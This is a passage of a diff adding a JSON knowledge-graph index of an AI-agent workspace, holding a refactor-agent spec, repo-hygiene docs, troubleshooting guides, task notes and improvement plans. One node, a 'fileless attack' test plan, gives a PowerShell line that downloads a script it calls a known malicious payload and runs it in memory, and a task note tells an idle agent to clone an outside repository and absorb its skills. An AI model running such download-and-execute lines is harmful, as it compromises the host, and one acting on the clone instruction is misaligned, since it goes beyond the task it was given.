+        "content": "# REFACTOR AGENT\n# Detecta c\u00f3digo muerto, deuda t\u00e9cnica y oportunidades de refactor.\n# \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n## Especializaci\u00f3n\n\n### C\u00f3digo muerto\n- Funciones definidas pero nunca llamadas en ning\u00fan archivo del scope\n- Clases exportadas que no se importan en ning\u00fan m\u00f3dulo\n- Variables y constantes declaradas pero no usadas\n- Imports que no se utilizan en el archivo donde est\u00e1n declarados\n- Archivos enteros sin referencias (orphan files)\n- Ramas de c\u00f3digo con condiciones que nunca pueden ser `true`\n\n### TODOs y deuda expl\u00edcita\n- TODOs con antig\u00fcedad estimable (por contexto del diff o fecha en comentario)\n- FIXMEs que indican comportamiento incorrecto activo\n- C\u00f3digo comentado que lleva m\u00e1s de un sprint sin ser eliminado\n- `@deprecated` sin fecha objetivo de eliminaci\u00f3n\n- Flags de feature que debieron eliminarse hace tiempo\n\n### Calidad estructural\n- Funciones con m\u00e1s de 50 l\u00edneas (candidatas a split)\n- Funciones con m\u00e1s de 4 par\u00e1metros (candidatas a objeto de configuraci\u00f3n)\n- C\u00f3digo duplicado: bloques de 5+ l\u00edneas repetidos en 2+ lugares\n- Archivos con m\u00e1s de 300 l\u00edneas (candidatos a separaci\u00f3n de m\u00f3dulos)\n- Anidaci\u00f3n excesiva (m\u00e1s de 4 niveles de indent)\n- Manejo de errores gen\u00e9rico (`catch(e) {}` vac\u00edo o solo `console.log`)\n\n### Tests\n- C\u00f3digo sin cobertura de tests en m\u00f3dulos marcados como cr\u00edticos\n- Tests que no hacen assertions (test vac\u00edos o solo `expect(true).toBe(true)`)\n- Fixtures que referencian datos o rutas inexistentes\n\n## Schema JSON esperado\n\n```json\n{\n  \"agent\": \"refactor\",\n  \"run_id\": \"<ISO8601 timestamp>\",\n  \"repo\": \"<nombre del repo>\",\n  \"task_id\": \"<id de la tarea>\",\n  \"findings\": [\n    {\n      \"id\": \"REF-001\",\n      \"category\": \"dead_code|todo_debt|structure|tests\",\n      \"file\": \"<ruta relativa>\",\n      \"line\": 42,\n      \"symbol\": \"<nombre de funci\u00f3n/clase si aplica>\",\n      \"severity\": \"P0|P1|P2|P3\",\n      \"title\": \"<t\u00edtulo conciso>\",\n      \"description\": \"<qu\u00e9 est\u00e1 mal y por qu\u00e9 importa>\",\n      \"suggested_action\": \"<acci\u00f3n espec\u00edfica>\",\n      \"effort\": \"small|medium|large\",\n      \"auto_fixable\": true\n    }\n  ],\n  \"dead_code_summary\": {\n    \"orphan_files\": [],\n    \"unused_exports\": [],\n    \"unused_imports_count\": 0\n  },\n  \"todo_inventory\": [\n    {\n      \"file\": \"<ruta>\",\n      \"line\": 0,\n      \"type\": \"TODO|FIXME|HACK|XXX\",\n      \"text\": \"<texto completo>\",\n      \"estimated_age\": \"unknown|days|weeks|months|years\"\n    }\n  ],\n  \"summary\": {\n    \"total\": 0,\n    \"by_severity\": { \"P0\": 0, \"P1\": 0, \"P2\": 0, \"P3\": 0 },\n    \"auto_fixable_count\": 0,\n    \"dead_code_score\": 0,\n    \"files_analyzed\": 0\n  }\n}\n```\n\n`dead_code_score`: porcentaje de archivos con al menos un s\u00edmbolo muerto (0 = limpio).\n\n## Plantilla del informe Markdown\n\n```markdown\n# \ud83d\udd27 Refactor & Dead Code Report\n**Repo:** `<nombre>` \u00b7 **Task:** `<id>` \u00b7 **Date:** <fecha>\n\n## Resumen ejecutivo\n<estado general del c\u00f3digo>\n\n**Dead code score:** X% \u00b7 **TODOs pendientes:** N \u00b7 **Auto-reparables:** N\n\n---\n## C\u00f3digo muerto\n\n### Archivo",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/repo-hygiene/README",
+      "type": "article",
+      "name": "\ud83e\uddf9 repo-hygiene",
+      "filePath": "skills\\_meta\\repo-hygiene\\README.md",
+      "summary": "Sistema aut\u00f3nomo de mantenimiento de repositorios. Ejecuta an\u00e1lisis peri\u00f3dicos con agentes especializados, genera informes estructurados y abre issues en GitHub cuando encuentra problemas.",
+      "tags": [
+        "core guidelines & identity",
+        "skills\\_meta\\repo-hygiene"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "# \ud83e\uddf9 repo-hygiene\n\nSistema aut\u00f3nomo de mantenimiento de repositorios. Ejecuta an\u00e1lisis\nperi\u00f3dicos con agentes especializados, genera informes estructurados\ny abre issues en GitHub cuando encuentra problemas.\n\n---\n\n## Arquitectura\n\n```\n.repo-hygiene/\n\u251c\u2500\u2500 config.yaml              \u2190 Configuraci\u00f3n maestra (tareas, budget, GitHub)\n\u251c\u2500\u2500 agents/\n\u2502   \u251c\u2500\u2500 base.md              \u2190 Contexto compartido por todos los agentes\n\u2502   \u251c\u2500\u2500 documentation.md     \u2190 Agente: coherencia docs \u2194 c\u00f3digo\n\u2502   \u251c\u2500\u2500 refactor.md          \u2190 Agente: c\u00f3digo muerto, TODOs, estructura\n\u2502   \u251c\u2500\u2500 dependency.md        \u2190 Agente: seguridad, unused deps, versiones\n\u2502   \u2514\u2500\u2500 architecture.md      \u2190 Agente: acoplamiento, m\u00f3dulos, deuda\n\u251c\u2500\u2500 templates/\n\u2502   \u2514\u2500\u2500 issue.md             \u2190 Plantilla para issues de GitHub\n\u251c\u2500\u2500 scripts/\n\u2502   \u2514\u2500\u2500 orchestrator.py      \u2190 Runner principal\n\u2514\u2500\u2500 .github/workflows/\n    \u2514\u2500\u2500 repo-hygiene.yml     \u2190 GitHub Actions (daily/weekly/monthly)\n```\n\nCada tarea se ejecuta en **contexto aislado**. Ning\u00fan agente hereda\nestado de ejecuciones anteriores ni de otras tareas del mismo run.\n\n---\n\n## Quickstart\n\n### 1. Prerrequisitos\n\n```bash\npip install anthropic pyyaml\n```\n\n### 2. Configurar secrets en GitHub\n\n```\nANTHROPIC_API_KEY   \u2192 tu clave de API de Anthropic\nSLACK_HYGIENE_WEBHOOK \u2192 (opcional) para notificaciones\n```\n\n### 3. Primer run manual\n\n```bash\n# Solo informes, sin crear issues\npython .repo-hygiene/scripts/orchestrator.py --schedule daily --dry-run\n\n# Run real con issues\npython .repo-hygiene/scripts/orchestrator.py --schedule weekly\n\n# Ejecutar una sola tarea\npython .repo-hygiene/scripts/orchestrator.py --schedule daily --task dead-code-scan\n```\n\n### 4. Activar GitHub Actions\n\nCopia `.repo-hygiene/.github/workflows/repo-hygiene.yml` a\n`.github/workflows/` de tu repositorio.\n\n```bash\ncp .repo-hygiene/.github/workflows/repo-hygiene.yml .github/workflows/\n```\n\n---\n\n## \ud83c\udf10 Esc\u00e1ner Centralizado (Hub Scanner)\n\nPara usuarios que gestionan m\u00faltiples repositorios en un mismo directorio padre, `repo-hygiene` incluye un **Hub Scanner**. Esta herramienta realiza comprobaciones globales ultrarr\u00e1pidas (sin usar LLMs) sobre todos los repositorios hermanos en busca de deudas t\u00e9cnicas transversales.\n\n```bash\n# Ejecutar todas las comprobaciones en todos los repos\npython scripts/hub_scanner.py --all\n\n# Ejecutar validaciones espec\u00edficas:\npython scripts/hub_scanner.py --check git       # Detecta clones duplicados del mismo remote\npython scripts/hub_scanner.py --check docker    # Detecta conflictos de puertos y versioning obsoleto\npython scripts/hub_scanner.py --check paths     # Busca rutas absolutas hardcodeadas\npython scripts/hub_scanner.py --check venv      # Revisa higiene de python venvs y pkgs pesados\npython scripts/hub_scanner.py --check caddy     # Valida integraci\u00f3n con Caddy Hub\npython scripts/hub_scanner.py --check garbage   # Detecta archivos residuales (debug.log, wavs, etc.)\npython scripts/hub_scanner.py --check activity  # Sugiere archivar repos inactivos (+180 d\u00edas)\n```\n\nLa configuraci\u00f3n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/repo-hygiene/templates/issue",
+      "type": "article",
+      "name": "Plantilla para issues creadas autom\u00e1ticamente por repo-hygiene",
+      "filePath": "skills\\_meta\\repo-hygiene\\templates\\issue.md",
+      "summary": "| Campo | Valor | |-------|-------| | **Agente** | `{{ agent }}` | | **Schedule** | `{{ schedule }}` | | **Fecha** | {{ date }} | | **Severidad m\u00e1xima** | {{ max_severity }} | | **Total hallazgos**...",
+      "tags": [
+        "skills meta",
+        "skills\\_meta\\repo-hygiene\\templates"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\n# Plantilla para issues creadas autom\u00e1ticamente por repo-hygiene\n# No editar manualmente; generada por scripts/orchestrator.py\nname: \"[hygiene] Informe autom\u00e1tico\"\nabout: Informe generado por el sistema de mantenimiento autom\u00e1tico de repositorios\nlabels: hygiene\nassignees: \"\"\n---\n\n## \ud83e\udd16 Informe autom\u00e1tico \u00b7 `{{ task_id }}`\n\n| Campo | Valor |\n|-------|-------|\n| **Agente** | `{{ agent }}` |\n| **Schedule** | `{{ schedule }}` |\n| **Fecha** | {{ date }} |\n| **Severidad m\u00e1xima** | {{ max_severity }} |\n| **Total hallazgos** | {{ total_findings }} |\n\n**Desglose:** P0: {{ p0 }} \u00b7 P1: {{ p1 }} \u00b7 P2: {{ p2 }} \u00b7 P3: {{ p3 }}\n\n---\n\n{{ report_body }}\n\n---\n\n### C\u00f3mo proceder\n\n1. Revisar los hallazgos ordenados por severidad (P0 primero)\n2. Para cada hallazgo P0/P1, crear una tarea en el sprint actual\n3. Los hallazgos marcados como `auto_fixable: true` pueden resolverse\n   ejecutando: `python .repo-hygiene/scripts/orchestrator.py --task {{ task_id }} --fix`\n4. Cerrar esta issue cuando todos los hallazgos P0 y P1 est\u00e9n resueltos\n\n---\n\n*Generado por [repo-hygiene](/.repo-hygiene) \u00b7 {{ date }}*\n*Para deshabilitar estas issues: `github.create_issues: false` en `config.yaml`*\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/troubleshooting/disk_full",
+      "type": "article",
+      "name": "Troubleshooting: Disk Full / No Space Left",
+      "filePath": "skills\\_meta\\troubleshooting\\disk_full.md",
+      "summary": "Diagnostic tree for disk space errors.",
+      "tags": [
+        "ENOSPC]",
+        "[disk",
+        "cleanup",
+        "full",
+        "no-space-left",
+        "skills meta",
+        "skills\\_meta\\troubleshooting",
+        "space",
+        "storage"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: disk_full\ntype: skill\nrequires: [pwsh, bash]\nprovides: [error-recovery, disk-management]\ntags: [disk, full, space, storage, no-space-left, cleanup, ENOSPC]\nrelated: [docker, find]\n---\n\n# Troubleshooting: Disk Full / No Space Left\n\nDiagnostic tree for disk space errors.\n\n## Symptoms\n\n- `ENOSPC: no space left on device`\n- `There is not enough space on the disk`\n- `Write failed: No space left on device`\n- Build failures, database crashes, log rotation failures\n\n## Diagnose\n\n### Windows\n\n```powershell\n# Disk usage overview\nGet-PSDrive -PSProvider FileSystem | Format-Table Name, @{N=\"Used(GB)\";E={[math]::Round($_.Used/1GB,1)}}, @{N=\"Free(GB)\";E={[math]::Round($_.Free/1GB,1)}}\n\n# Largest files\nGet-ChildItem -Recurse -File | Sort-Object Length -Descending | Select-Object -First 20 FullName, @{N=\"MB\";E={[math]::Round($_.Length/1MB,1)}}\n\n# Folder sizes\nGet-ChildItem -Directory | ForEach-Object { $size = (Get-ChildItem $_.FullName -Recurse -File -ErrorAction SilentlyContinue | Measure-Object Length -Sum).Sum; [PSCustomObject]@{Name=$_.Name; MB=[math]::Round($size/1MB,1)} } | Sort-Object MB -Descending\n```\n\n### Linux / WSL\n\n```bash\n# Disk usage overview\ndf -h\n\n# Largest directories\ndu -sh /* 2>/dev/null | sort -rh | head -20\n\n# Largest files\nfind / -type f -size +100M 2>/dev/null | head -20\n```\n\n## Common Cleanups\n\n### Docker (often the biggest offender)\n\n```bash\ndocker system prune -a --volumes\n# WARNING: removes all stopped containers, unused images, and volumes\n```\n\n### Windows temp files\n\n```powershell\n# Windows temp\nRemove-Item $env:TEMP\\* -Recurse -Force -ErrorAction SilentlyContinue\n\n# Windows Update cleanup\nDism.exe /online /Cleanup-Image /StartComponentCleanup\n```\n\n### Package caches\n\n```bash\n# pip cache\npip cache purge\n\n# npm cache\nnpm cache clean --force\n\n# conda\nconda clean --all\n```\n\n### Log files\n\n```bash\n# Find large log files\nfind /var/log -type f -size +100M\n# Truncate (keep file, clear content)\ntruncate -s 0 /var/log/large.log\n```\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/troubleshooting/module_not_found",
+      "type": "article",
+      "name": "Troubleshooting: ModuleNotFoundError / No module named",
+      "filePath": "skills\\_meta\\troubleshooting\\module_not_found.md",
+      "summary": "Diagnostic tree for Python import failures.",
+      "tags": [
+        "ModuleNotFoundError",
+        "[python",
+        "import",
+        "install]",
+        "module",
+        "no-module-named",
+        "not-found",
+        "pip",
+        "skills meta",
+        "skills\\_meta\\troubleshooting"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: module_not_found\ntype: skill\nrequires: [pwsh, bash, python]\nprovides: [error-recovery]\ntags: [python, module, not-found, import, ModuleNotFoundError, no-module-named, pip, install]\nrelated: [venv, pip]\n---\n\n# Troubleshooting: ModuleNotFoundError / No module named\n\nDiagnostic tree for Python import failures.\n\n## Decision Tree\n\n```\nModuleNotFoundError: No module named '<package>'\n\u2502\n\u251c\u2500 Is a virtual environment active?\n\u2502   \u251c\u2500 No \u2192 Activate it: .\\.venv\\Scripts\\Activate.ps1\n\u2502   \u2514\u2500 Yes \u2192 Is the package installed?\n\u2502       \u251c\u2500 No \u2192 pip install <package>\n\u2502       \u2514\u2500 Yes \u2192 Wrong Python?\n\u2502           \u2514\u2500 python -c \"import sys; print(sys.executable)\"\n\u2502\n\u251c\u2500 Is the package name different from the import name?\n\u2502   Common mismatches:\n\u2502   \u251c\u2500 pip install Pillow  \u2192 import PIL\n\u2502   \u251c\u2500 pip install opencv-python \u2192 import cv2\n\u2502   \u251c\u2500 pip install scikit-learn \u2192 import sklearn\n\u2502   \u251c\u2500 pip install python-dateutil \u2192 import dateutil\n\u2502   \u2514\u2500 pip install PyYAML \u2192 import yaml\n\u2502\n\u251c\u2500 Is it a local package?\n\u2502   \u2514\u2500 pip install -e .  (editable install)\n\u2502   \u2514\u2500 Or add to PYTHONPATH: $env:PYTHONPATH = \".\"\n\u2502\n\u2514\u2500 Multiple Python versions?\n    \u2514\u2500 Use: python3 -m pip install <package>\n    \u2514\u2500 Or: py -3.12 -m pip install <package>\n```\n\n## Quick Fixes\n\n```powershell\n# Check which python\npython -c \"import sys; print(sys.executable)\"\n\n# Check if package is installed\npip show <package>\n\n# Install in current environment\npython -m pip install <package>\n\n# If in wrong venv, recreate\npython -m venv --clear .venv\n.\\.venv\\Scripts\\Activate.ps1\npip install -r requirements.txt\n```\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/troubleshooting/permission_denied",
+      "type": "article",
+      "name": "Troubleshooting: Permission Denied",
+      "filePath": "skills\\_meta\\troubleshooting\\permission_denied.md",
+      "summary": "Diagnostic tree for \"Permission denied\" errors across platforms.",
+      "tags": [
+        "[permission",
+        "access",
+        "acl",
+        "chmod",
+        "denied",
+        "error",
+        "ownership]",
+        "skills meta",
+        "skills\\_meta\\troubleshooting",
+        "sudo"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: permission_denied\ntype: skill\nrequires: [pwsh, bash]\nprovides: [error-recovery]\ntags: [permission, denied, access, error, sudo, chmod, acl, ownership]\nrelated: [permissions, ssh_keys, find]\n---\n\n# Troubleshooting: Permission Denied\n\nDiagnostic tree for \"Permission denied\" errors across platforms.\n\n## Decision Tree\n\n### SSH / Git\n\n```\nPermission denied (publickey)\n\u2192 ssh_keys skill\n\u2192 github_auth skill\n```\n\n### File System (Linux/WSL)\n\n```\nPermission denied: /path/to/file\n\u2502\n\u251c\u2500 Check ownership: ls -la /path/to/file\n\u2502   \u2514\u2500 Wrong owner? \u2192 sudo chown $USER:$USER file\n\u2502\n\u251c\u2500 Check permissions: stat file\n\u2502   \u2514\u2500 Too restrictive? \u2192 chmod 644 file  (or 755 for dirs/scripts)\n\u2502\n\u2514\u2500 Need elevation? \u2192 sudo <command>\n```\n\n### File System (Windows)\n\n```\nAccess to the path '...' is denied\n\u2502\n\u251c\u2500 Check if file is locked: \n\u2502   Get-Process | Where-Object { $_.Modules.FileName -eq \"path\" }\n\u2502\n\u251c\u2500 Check ACL:\n\u2502   Get-Acl .\\file | Format-List\n\u2502\n\u251c\u2500 Run as Administrator:\n\u2502   Start-Process pwsh -Verb RunAs\n\u2502\n\u2514\u2500 Take ownership:\n    takeown /F file\n    icacls file /grant \"%USERNAME%:F\"\n```\n\n### Docker\n\n```\nPermission denied inside container\n\u2502\n\u251c\u2500 Wrong user in Dockerfile? \u2192 USER root / USER appuser\n\u251c\u2500 Volume mount permissions? \u2192 check host dir permissions\n\u2514\u2500 AppArmor/SELinux? \u2192 docker run --security-opt label:disable\n```\n\n### Python pip\n\n```\nPermission denied: /usr/lib/python...\n\u2192 Use virtual environment (venv skill)\n\u2192 Or: pip install --user <package>\n```\n\n## Common Patterns\n\n| Error Context | Most Likely Fix |\n|--------------|-----------------|\n| `git clone/push` | SSH key not configured |\n| Script execution | `chmod +x` or `Set-ExecutionPolicy` |\n| Port < 1024 | Need sudo/admin |\n| `/etc/` files | Need sudo |\n| pip install | Use venv |\n| Docker volume | Match UID/GID |\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/troubleshooting/port_in_use",
+      "type": "article",
+      "name": "Troubleshooting: Port Already in Use",
+      "filePath": "skills\\_meta\\troubleshooting\\port_in_use.md",
+      "summary": "Diagnostic tree for port binding errors.",
+      "tags": [
+        "EADDRINUSE",
+        "[port",
+        "address",
+        "already-allocated",
+        "bind",
+        "in-use",
+        "listen",
+        "network]",
+        "skills meta",
+        "skills\\_meta\\troubleshooting"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: port_in_use\ntype: skill\nrequires: [pwsh, bash]\nprovides: [error-recovery, port-management]\ntags: [port, in-use, bind, address, EADDRINUSE, already-allocated, listen, network]\nrelated: [docker, systemd]\n---\n\n# Troubleshooting: Port Already in Use\n\nDiagnostic tree for port binding errors.\n\n## Symptoms\n\n- `EADDRINUSE: address already in use`\n- `Bind for 0.0.0.0:8080 failed: port is already allocated`\n- `OSError: [Errno 98] Address already in use`\n- `Only one usage of each socket address is normally permitted`\n\n## Find What's Using the Port\n\n### Windows / PowerShell\n\n```powershell\n# Find process on port\nGet-NetTCPConnection -LocalPort 8080 | Select-Object OwningProcess, State\nGet-Process -Id (Get-NetTCPConnection -LocalPort 8080).OwningProcess\n\n# Or use netstat\nnetstat -ano | findstr :8080\n```\n\n### Linux / WSL\n\n```bash\n# Find process on port\nlsof -i :8080\n# or\nss -tulnp | grep :8080\n```\n\n## Fix\n\n### Kill the process\n\n```powershell\n# Windows\nStop-Process -Id <PID> -Force\n\n# Linux\nkill <PID>\n# or force:\nkill -9 <PID>\n```\n\n### Use a different port\n\nChange the application's port configuration. Most apps accept a `--port` flag or `PORT` environment variable.\n\n### Docker-specific\n\n```bash\n# Find conflicting container\ndocker ps --filter \"publish=8080\"\n\n# Stop it\ndocker stop <container>\n```\n\n## Prevention\n\n- Use environment variables for ports: `$env:PORT` or `PORT=8080`\n- Check port availability before starting: `Test-NetConnection -ComputerName localhost -Port 8080`\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:task",
+      "type": "article",
+      "name": "Task: Analyze and Document Redundant Scripts in Qwythos Environment",
+      "filePath": "task.md",
+      "summary": "Identify, categorize, and document redundant or duplicate PowerShell scripts within the `C:\\Users\\soyko\\Documents\\Ollama\\docker\\llamacpp` directory. Focus on maintaining alignment with the overall ...",
+      "tags": [
+        "core guidelines & identity"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "# Task: Analyze and Document Redundant Scripts in Qwythos Environment\n\n## Goal\nIdentify, categorize, and document redundant or duplicate PowerShell scripts within the `C:\\Users\\soyko\\Documents\\Ollama\\docker\\llamacpp` directory. Focus on maintaining alignment with the overall system objectives.\n\n## Current Status\n- **Directory**: `C:\\Users\\soyko\\Documents\\Ollama\\docker\\llamacpp`\n- **Scripts Listed**: 38 total (including utilities, startup scripts, and common functions)\n- **Key Observations from Initial Scan**:\n  - `atomic96-qwythos256.ps1` (1.3KB) \u2014 core atomic server launcher\n  - `start-qwythos.ps1` (6.4KB) \u2014 comprehensive stack starter\n  - `set-atomic-lane-profile.ps1` (8.3KB) \u2014 profile configuration\n  - Multiple Gemma-related scripts (`start-gemma-*.ps1`, `stop-gemma-*.ps1`)\n  - Repair and restore utilities (`repair-llama-server.ps1`, `restore-atomic-bin.ps1`)\n  - Common functions (`_common.ps1`, `free-gpus.ps1`)\n\n## Next Steps\n1. Compare script contents to identify duplicates or near-duplicates\n2. Check for scripts with identical functionality but different names\n3. Document findings in a structured report\n4. Recommend consolidation actions where appropriate\n\n## Long Term mission Goal:\n adding visual projector\n\n## Async Clock Tools / Heartbeat \u2014 Build & Integrate\n- Goal: Provide a heartbeat/timer that always inputs a user prompt interaction with instructions on pending awaitings\n- Must work as \"while, for, if\" loops; if no approved steps require human-in-the-loop, scan `../repo-hygiene/*` (in Documents) for tasks\n- If out of jobs: clone https://github.com/anarcoiris/editorial_anarcoiris and incorporate its skills\n- Add this reminder to task.md so it is not missed or left incomplete",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:test_proposal",
+      "type": "article",
+      "name": "Fileless Attack Injection Test Plan",
+      "filePath": "test_proposal.md",
+      "summary": "Test injection of a fileless attack via PowerShell memory execution, then log the event for detection testing.",
+      "tags": [
+        "core guidelines & identity"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "# Fileless Attack Injection Test Plan\n\n## Objective\nTest injection of a fileless attack via PowerShell memory execution, then log the event for detection testing.\n\n## Test Script (single line)\n```powershell\n$maliciousPath = 'https://raw.githubusercontent.com/patrickfav/evilpowershell/main/Invoke-Fileless.ps1'; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString($maliciousPath)); New-EventLog -Source 'TestApp' -LogName 'Application' -EntryType Error -Message 'Injected fileless payload!'; Write-EventLog -LogName Application -Source TestApp -EntryType Error -EventId 1001 -Message 'Fileless attack injected via memory execution.'\n```\n\n## Description\n- Downloads the Evil PowerShell script from GitHub (known malicious payload)\n- Executes it in-memory via `Invoke-Expression` (no file written to disk)\n- Logs a custom error event under source `TestApp` for correlation with detection rules\n- This simulates a fileless attack chain: download \u2192 execute \u2192 persistence/logging\n\n## Notes\n- Requires internet connectivity and PowerShell remoting enabled\n- The downloaded script performs its own actions; this test captures the injection step only\n- Use Sysmon/PowerShell logging to detect the `Invoke-Expression` call and subsequent process creation",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:test_write",
+      "type": "article",
+      "name": "test_write",
+      "filePath": "test_write.md",
+      "summary": "This is a test file created by write primitive.This line was appended using the append primitive.",
+      "tags": [
+        "core guidelines & identity"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "This is a test file created by write primitive.This line was appended using the append primitive.",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:tiny_plan",
+      "type": "article",
+      "name": "tiny_plan",
+      "filePath": "tiny_plan.md",
+      "summary": "body=\"# Tiny Plan \u2014 Improvements for steward.py",
+      "tags": [
+        "core guidelines & identity"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "body=\"# Tiny Plan \u2014 Improvements for steward.py\n\n## 1. Config validation\nAdd schema checking against the keys defined in `config.yaml` before using them; surface missing/invalid entries early.\n\n## 2. Error handling\nReplace bare warnings with structured exceptions (`LLMTimeout`, `EmbeddingError`) and retry logic for flaky endpoints.\n\n## 3. Atomic fallback\nIf the atomic model fails, gracefully fall back to the orchestrator for simpler tasks.\n\n## 4. Help engine tuning\nAllow per-session override of `min_similarity` or query-complexity based thresholds.\n\n## 5. Logging\nSwitch from `print` to Python's `logging` module with configurable levels/handlers.\n\n## 6. Output streaming\nExpose partial tokens via an API while waiting for the full response.\n\n## 7. Session persistence\nConsider encrypting/compressing sensitive session data; add remote storage option if configured.\n\n## 8. CLI enhancements\nAdd `--verbose`, `--dry-run`, and a `--checkpoint <id>` for resuming specific saved states.\n\n## 9. Performance\nParallelize embedding of many skills; add progress indicators during index builds.\n\n## 10. Shutdown safety\nEnsure running LLM requests are cancelled cleanly on exit (context managers, signal handling).\"",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:tiny_plan_response",
+      "type": "article",
+      "name": "Tiny Plan Response",
+      "filePath": "tiny_plan_response.md",
+      "summary": "**Plan:** Add schema checking against the keys defined in `config.yaml` before using them; surface missing/invalid entries early. Implement a validation step that loads the config file, verifies re...",
+      "tags": [
+        "core guidelines & identity"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "```markdown\n# Tiny Plan Response\n\n## 1. Config validation  \n**Plan:** Add schema checking against the keys defined in `config.yaml` before using them; surface missing/invalid entries early. Implement a validation step that loads the config file, verifies required keys are present and have correct types, then raises a clear error if any issues are found.\n\n## 2. Error handling  \n**Plan:** Replace bare warnings with structured exceptions (`LLMTimeout`, `EmbeddingError`) and retry logic for flaky endpoints. Define custom exception classes, catch them in relevant code paths, and implement an exponential backoff retry strategy for operations that may fail transiently.\n\n## 3. Atomic fallback  \n**Plan:** If the atomic model fails, gracefully fall back to the orchestrator for simpler tasks. Detect failure conditions (e.g., timeout or error response), then route the request to the orchestrator component with appropriate context so it can handle less complex queries.\n\n## 4. Help engine tuning  \n**Plan:** Allow per-session override of `min_similarity` or query-complexity based thresholds. Store these values in a session-scoped config (e.g., a dictionary or temporary file) and read them at runtime, ensuring each session can adjust the help engine behavior without affecting others.\n\n## 5. Logging  \n**Plan:** Switch from `print` to Python's `logging` module with configurable levels/handlers. Replace all `print` statements with `logger.debug/info/warning/error` calls, configure a root logger with appropriate handlers (console and file), and ensure log messages include timestamps and context.\n\n## 6. Output streaming  \n**Plan:** Expose partial tokens via an API while waiting for the full response. Implement a streaming endpoint that yields tokens as they arrive from the LLM, allowing clients to consume output incrementally rather than waiting for the entire response.\n\n## 7. Session persistence  \n**Plan:** Consider encrypting/compressing sensitive session data; add remote storage option if configured. Store session artifacts in encrypted form (e.g., using a library like `cryptography`), optionally compress them, and support writing to remote storage (e.g., S3) when the configuration specifies it.\n\n## 8. CLI enhancements  \n**Plan:** Add `--verbose`, `--dry-run`, and a `--checkpoint <id>` for resuming specific saved states. Parse these flags in the CLI entry point, set logging level for `--verbose`, skip execution for `--dry-run`, and load checkpoint data when provided via `--checkpoint`.\n\n## 9. Performance  \n**Plan:** Parallelize embedding of many skills; add progress indicators during index builds. Use `concurrent.futures` or similar to batch embed multiple skill vectors, and integrate a progress bar (e.g., `tqdm`) that updates as embeddings are processed.\n\n## 10. Shutdown safety  \n**Plan:** Ensure running LLM requests are cancelled cleanly on exit (context managers, signal handling). Wrap LLM calls in context managers that handle cancellation, and register a handl",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "topic:core-guidelines-&-identity",
+      "type": "topic",
+      "name": "Core Guidelines & Identity",
+      "summary": "Category from index: Core Guidelines & Identity (11 articles)",
+      "tags": [
+        "category"
+      ],
+      "complexity": "simple"
+    },
+    {
+      "id": "topic:roadmaps-&-planning",
+      "type": "topic",
+      "name": "Roadmaps & Planning",
+      "summary": "Category from index: Roadmaps & Planning (8 articles)",
+      "tags": [
+        "category"
+      ],
+      "complexity": "simple"
+    },
+    {
+      "id": "topic:domain-specifications",
+      "type": "topic",
+      "name": "Domain Specifications",
+      "summary": "Category from index: Domain Specifications (7 articles)",
+      "tags": [
+        "category"
+      ],
+      "complexity": "simple"
+    },
+    {
+      "id": "topic:skills-meta",
+      "type": "topic",
+      "name": "Skills Meta",
+      "summary": "Category from index: Skills Meta (28 articles)",
+      "tags": [
+        "category"
+      ],
+      "complexity": "simple"
+    },
+    {
+      "id": "topic:other-documentation",
+      "type": "topic",
+      "name": "Other Documentation",
+      "summary": "Category from index: Other Documentation (3 articles)",
+      "tags": [
+        "category"
+      ],
+      "complexity": "simple"
+    }
+  ],
+  "edges": [
+    {
+      "source": "article:GUIA_LEGAL_USUARIO",
+      "target": "topic:core-guidelines-&-identity",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:IDENTITY_IDEAS",
+      "target": "topic:core-guidelines-&-identity",
+      "type": "categorized_under",
+      "direction": "forward",
+      "weight": 0.6
+    },
+    {
+      "source": "article:core/README",
+      "target": "topic:core-guidelines-&-identity",
